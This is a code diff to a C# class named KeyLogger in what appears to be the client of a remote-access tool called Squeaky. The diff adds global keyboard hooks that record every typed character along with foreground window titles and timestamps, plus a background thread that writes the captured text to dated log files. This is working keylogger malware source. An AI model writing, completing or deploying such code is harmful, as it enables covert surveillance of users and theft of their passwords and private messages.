@@ -4,25 +4,54 @@ using System.Collections.Generic;
 using System;
 using System.Runtime.InteropServices;
 using System.Text;
+using System.Threading;
+using System.IO;
 using System.Globalization;
 
 namespace Squeaky.Client.Utilities
 {
     class KeyLogger
     {
+        public static List<Keys> PressedKeys = new List<Keys>();
         private static StringBuilder LogBuffer = new StringBuilder();
         private static string LastWindowTitle = "";
 
-        public static List<Keys> PressedKeys;
-        public static List<Char> PressedChars;
+        private static bool FirstLine = true;
+
+        private static string LogDir = @"kl\";
+        private static string CurrentLog = "";
+
+        private static void WriteLoop()
+        {
+            var dateFile = DateTime.Now.ToString("M-d-yyyy") + ".log";
+
+            foreach (string file in Directory.GetFiles(LogDir))
+            {
+                if (file == dateFile)
+                {
+                    FirstLine = false;
+                }
+            }
+
+            if (LogBuffer.Length != 0)
+            {
+                using (StreamWriter sw = File.CreateText($"{LogDir}{dateFile}"))
+                {
+                    sw.Write(LogBuffer);
+                    LogBuffer.Clear();
+                }
+            }
+
+            Thread.Sleep(15000);
+        }
 
         private static void OnKeyDown(object sender, KeyEventArgs e)
         {
-            var activeWindowTitle = KeyLoggerHelper.GetForegroundWindowTitle();
-            if (!string.IsNullOrEmpty(activeWindowTitle) && activeWindowTitle != LastWindowTitle)
+            var activewindowtitle = KeyLoggerHelper.GetForegroundWindowTitle();
+            if (!string.IsNullOrEmpty(activewindowtitle) && activewindowtitle != LastWindowTitle)
             {
-                LastWindowTitle = activeWindowTitle;
-                LogBuffer.Append($"\n[{activeWindowTitle}] [{DateTime.Now.ToString("HH:mm:ss")}]\n");
+                LastWindowTitle = activewindowtitle;
+                LogBuffer.Append($"{(FirstLine ? "" : "\n\n")}[{activewindowtitle}] [{DateTime.Now.ToString("hh:mm:ss")}]\n");
             }
 
             if (!KeyLoggerHelper.IsExcludedKey(e.KeyCode) && !PressedKeys.Contains(e.KeyCode))
@@ -34,17 +63,28 @@ namespace Squeaky.Client.Utilities
 
         private static void OnKeyUp(object sender, KeyEventArgs e)
         {
-            PressedChars.Remove((char)e.KeyCode);
             PressedKeys.Remove(e.KeyCode);
         }
 
         private static void OnKeyPress(object sender, KeyPressEventArgs e)
         {
-            if (!PressedChars.Contains(e.KeyChar))
+            if (!KeyLoggerHelper.IsSpecialKey(e.KeyChar))
             {
-                PressedChars.Add(e.KeyChar);
                 LogBuffer.Append(e.KeyChar);
             }
+        }
+
+        public static void Start()
+        {
+            var hook = Hook.GlobalEvents();
+            hook.KeyDown += OnKeyDown;
+            hook.KeyUp += OnKeyUp;
+            hook.KeyPress += OnKeyPress;
+
+            Thread WriteLoopThread = new Thread(WriteLoop);
+            WriteLoopThread.Start();
+
+            Application.Run();
         }
     }
 
@@ -76,16 +116,15 @@ namespace Squeaky.Client.Utilities
                     || k == Keys.Space);
         }
 
-        public static bool IsModifierKey(Keys key)
+        public static bool IsSpecialKey(char k)
         {
-            return (key == Keys.LControlKey
-                    || key == Keys.RControlKey
-                    || key == Keys.LMenu
-                    || key == Keys.RMenu
-                    || key == Keys.LWin
-                    || key == Keys.RWin
-                    || key == Keys.Control
-                    || key == Keys.Alt);
+            var kStr = k.ToString();
+            return (kStr == "\b"
+                    || kStr == "\n"
+                    || kStr == "\r"
+                    || kStr == "\t"
+                    || kStr == "\f"
+                    || kStr == "\v");
         }
     }
 }
